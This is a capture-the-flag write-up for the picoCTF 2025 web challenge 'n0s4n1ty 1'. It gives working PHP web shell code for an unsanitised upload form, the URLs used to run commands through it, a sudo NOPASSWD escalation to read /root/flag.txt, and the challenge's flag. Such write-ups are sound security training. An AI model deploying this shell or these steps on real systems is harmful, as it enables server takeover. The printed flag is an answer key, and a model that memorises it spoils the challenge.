# n0s4n1ty 1 - Web Exploitation (picoCTF 2025)

## Challenge Overview
- **Category**: Web Exploitation
- **Points**: 100
- **Author**: Prince Niyonshuti N.
- **Challenge URL**: [picoCTF n0s4n1ty 1](http://standard-pizzas.picoctf.net:57009/)

In this challenge, the task is to exploit a web vulnerability in a file upload functionality. By uploading a malicious PHP file, we gain the ability to run arbitrary commands on the server, ultimately allowing us to retrieve the flag stored in the `/root` directory.

## Steps to Solve

### 1. **Identify the Vulnerability**
   The challenge presents a file upload feature where a user can upload a profile picture. However, there is a flaw in the implementation: the uploaded files are not sanitized, which means we can upload arbitrary files, including PHP scripts.

### 2. **Upload a Malicious PHP Web Shell**
   The first step is to upload a PHP shell to the server. We can use the following PHP code for a simple web shell, [PHP File to upload](shell.php)
:

   ```php
   <?php
   if(isset($_GET['cmd'])){
       echo "<pre>";
       $cmd = $_GET['cmd'];  // Get command from the query string
       system($cmd);         // Execute the command and display output
       echo "</pre>";
   }
   ?>
   ```

   This shell allows us to execute commands on the server by appending `cmd=<command>` to the URL.

### 3. **Find the URL of the Uploaded Shell**
   After successfully uploading the PHP shell, the file is placed in the `uploads` directory on the server. The URL to access the shell will typically look like:

   ```
   http://standard-pizzas.picoctf.net:57009/uploads/shell.php
   ```

### 4. **Execute Commands via the Shell**
   Now that we have a web shell, we can start executing commands on the server. Begin by checking the current user:

   ```
   http://standard-pizzas.picoctf.net:57009/uploads/shell.php?cmd=whoami
   ```

   The response should show that the current user is `www-data`.

### 5. **Check for Sudo Permissions**
   Next, we check if the `www-data` user has permission to execute commands as `root`. This can be done by running:

   ```
   http://standard-pizzas.picoctf.net:57009/uploads/shell.php?cmd=sudo -l
   ```

   The response should show that `www-data` has `NOPASSWD` permissions, meaning it can run any command as `root` without a password:

   ```
   User www-data may run the following commands on challenge:
       (ALL) NOPASSWD: ALL
   ```

### 6. **Retrieve the Flag**
   Since we now have the ability to run commands as `root`, we can retrieve the flag stored in the `/root/flag.txt` file by running the following command:

   ```
   http://standard-pizzas.picoctf.net:57009/uploads/shell.php?cmd=sudo cat /root/flag.txt
   ```

   The output will display the flag:

   ```
   picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}
   ```

### 7. **Flag**
   The flag for this challenge is:

   ```
   picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}
   ```

## Summary of Exploit
- **Exploited Vulnerability**: File upload functionality without proper sanitization.
- **Exploited Method**: Uploaded a PHP web shell that allowed command execution.
- **Privilege Escalation**: Used `sudo -l` to verify that `www-data` had `NOPASSWD` privileges, allowing us to run commands as `root`.
- **Final Goal**: Retrieved the flag by running `sudo cat /root/flag.txt`.
